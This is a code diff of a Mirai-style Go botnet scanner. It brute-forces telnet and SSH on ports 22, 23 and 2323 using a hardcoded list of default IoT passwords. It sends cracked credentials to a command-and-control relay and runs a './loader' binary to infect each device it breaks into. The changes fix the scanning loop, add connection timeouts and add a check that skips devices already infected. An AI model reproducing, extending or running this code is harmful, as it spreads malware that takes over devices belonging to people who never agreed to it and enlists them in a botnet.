@@ -12,10 +12,10 @@ import (
 
 var (
 	MAlist = [][]string{
-        {"root", "vizxv"},
+        {"root", "password"},
 		{"admin", "password"},
-		{"root", "admin"},
 		{"admin", "admin"},
+		{"root", "admin"},
         {"root", "888888"},
         {"root", "xmhdipc"},
         {"root", "default"},
@@ -34,7 +34,7 @@ var (
         {"admin", "smcadmin"},
         {"admin", "1111"},
         {"root", "666666"},
-        {"root", "password"},
+		{"root", "vizxv"},
         {"root", "1234"},
         {"root", "klv123"},
         {"Administrator", "admin"},
@@ -111,20 +111,22 @@ func isTelnetOpen(ip string,port string) {
 					if strings.Contains(s,"incorrect"){
 						pindex++
 						user,password = getCredentials(pindex)
-						if pindex >= len(MAlist){
+						if pindex >= len(MAlist)-1{ // minus one is avoid over list length
 							break
 					}	
 					}
 					if strings.Contains(s,"#"){
 						fmt.Println("Sucessful")
 						if validateC2(ip,port){
-							c2crd(user,password,ip,port)
+							if c2crd(user,password,ip,port)==true{ //如果存在在DB 不再做二次感染
+								return
+							}
 						}else{
 							writetolocal(user+":"+password)
 						}
 						go func(){
-							fmt.Println("execute this file")
-							cmd:=exec.Command("./loader",user,password,ip,port)
+							fmt.Println("Success Execute this file")
+							cmd:=exec.Command("./loader" , user , password , ip , port)
 							cmd.Run()
 						}()
 						return 
@@ -191,11 +193,10 @@ func isSSHOpen(ip string) {
 	}
 }
 
-func writetolocal(data string ){
+func writetolocal(data string ){  //if not connect to server then write local file.
 	filename := "store.txt"
 	_, err := os.Stat(filename)
 	if os.IsNotExist(err) {
-		// 檔案不存在，建立檔案並寫入內容
 		file, err := os.Create(filename)
 		if err != nil {
 			fmt.Println("無法建立檔案:", err)
@@ -208,10 +209,8 @@ func writetolocal(data string ){
 			fmt.Println("寫入檔案失敗:", err)
 			return
 		}
-
 		fmt.Println("已建立新檔案並寫入內容")
 	} else {
-		// 檔案存在，直接寫入內容
 		file, err := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND, 0644)
 		if err != nil {
 			fmt.Println("開啟檔案失敗:", err)
@@ -248,12 +247,13 @@ func validateC2(ip string,port string )bool {
 			tcpClientA.Close()
 		}
 		fmt.Printf("[Scanner] Remote relay unreachable retrying in %s ...\n", __C2DELAY__)
+		fmt.Println("-----------------------------------")
 		time.Sleep(__C2DELAY__)
 	}
 	return false
 }
 
-func c2crd(usr string, psw string, ip string, port string) {
+func c2crd(usr string, psw string, ip string, port string) bool {
 	for {
 		fmt.Println("[Scanner] Sending credentials to remote relay..")
 		tcpClientA, err := net.Dial("tcp", fmt.Sprintf("%s:%d", __RELAY_H__, __RELAY_P__))
@@ -274,8 +274,11 @@ func c2crd(usr string, psw string, ip string, port string) {
 		dataStr := string(data[:n])
 		if dataStr == "10" {
 			tcpClientA.Close()
-			fmt.Println("[Scanner] Remote relay returned code 10(ok).")
-			break
+			fmt.Println("[Scanner] Remote relay returned code 10 (store success).")
+			return false
+		}else if (dataStr=="40"){  //避免二次存取用
+			fmt.Println("[Scanner] Remote relay returned code 40 (not success).")
+			return true
 		}
 		tcpClientA.Close()
 	}
@@ -286,7 +289,8 @@ func generateIP(index1 int,index0 int) string {
 }
 
 func checkPort(ip string, port int) bool {
-	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
+	//conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
+	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), time.Second * 1)
 	if err != nil {
 		return false
 	}
@@ -296,29 +300,28 @@ func checkPort(ip string, port int) bool {
 
 func Scanner() {
 	port:=[3]int{22,23,2323}
-	for i := 0; i <= 255; i++ {
+	for i := 1; i <= 255; i++ {
 		for j := 1; j <= 255; j++ {
 			ip := generateIP(i,j)
+			fmt.Println(ip)
 			for k:=0 ; k<len(port) ; k++{
-				if checkPort(ip,port[j]){
-					if port[j]==23 || port[j]==2323{
-						isTelnetOpen(ip,intToString(port[j]))
+				if checkPort(ip,port[k]){
+					if port[k]==23 || port[k]==2323{
+						isTelnetOpen(ip,intToString(port[k]))
 					}else{
 						isSSHOpen(ip)
 					}
 				}
 			}
+			fmt.Println("--------------------------------")
 		}
 	}
-	
- 
 }
 func intToString(num int) string {
 
 	if num == 0 {
 		return "0"
 	}
-
 	sign := ""
 	if num < 0 {
 		sign = "-"
@@ -330,19 +333,20 @@ func intToString(num int) string {
 		digits = append([]byte{digit}, digits...)
 		num /= 10
 	}
-
 	return sign + string(digits)
 }
 
 func main() {
 	fmt.Println("[Scanner] Scanner process started ..")
 	//isSSHOpen("192.168.1.163")
-	isTelnetOpen("192.168.1.181","23")
-	//Scanner()
+	isTelnetOpen("192.168.1.121","23")
+	
+	//Scanner() //若移植到裝置上掃描全域
 
 	//if validateC2("192.168.1.97","31337"){
 	//	c2crd("test","test","192.168.1.97","31337")
 	//} //test connect relay
-	time.Sleep(20*time.Second)
+
+	time.Sleep(20*time.Second)  // wait program
 }
 
